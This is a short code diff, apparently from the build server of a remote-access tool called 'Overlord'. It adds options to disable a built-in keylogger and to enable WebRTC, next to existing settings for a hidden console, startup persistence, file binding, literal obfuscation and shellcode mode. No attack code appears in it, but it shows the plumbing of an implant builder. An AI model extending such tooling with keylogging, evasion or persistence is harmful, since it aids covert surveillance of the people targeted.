@@ -86,6 +86,8 @@ type BuildProcessConfig = {
   startupName?: string;
   hideConsole?: boolean;
   noPrinting?: boolean;
+  disableKeylogger?: boolean;
+  enableWebrtc?: boolean;
   builtByUserId?: number;
   outputName?: string;
   garbleLiterals?: boolean;
@@ -857,6 +859,9 @@ func runBoundFiles() {
       if (config.noPrinting) {
         sendToStream({ type: "output", text: "Client printing disabled (noprint tag)\n", level: "info" });
       }
+      if (config.disableKeylogger) {
+        sendToStream({ type: "output", text: "Keylogger disabled (nokeylogger tag)\n", level: "info" });
+      }
 
       // Linux CGO builds must be fully statically linked to avoid glibc version
       // mismatches between the build server and target machines.
@@ -916,6 +921,8 @@ func runBoundFiles() {
         // Base tags: always present regardless of build pass
         const baseTags: string[] = [];
         if (config.noPrinting) baseTags.push("noprint");
+        if (config.disableKeylogger) baseTags.push("nokeylogger");
+        if (config.enableWebrtc) baseTags.push("overlord_webrtc");
         if (hasBoundFiles) baseTags.push("hasbinder");
         if (isIosTarget) baseTags.push("ios_target");
         if (config.shellcodeConsole && isShellcodeMode && os === "windows") baseTags.push("shellcode_console");
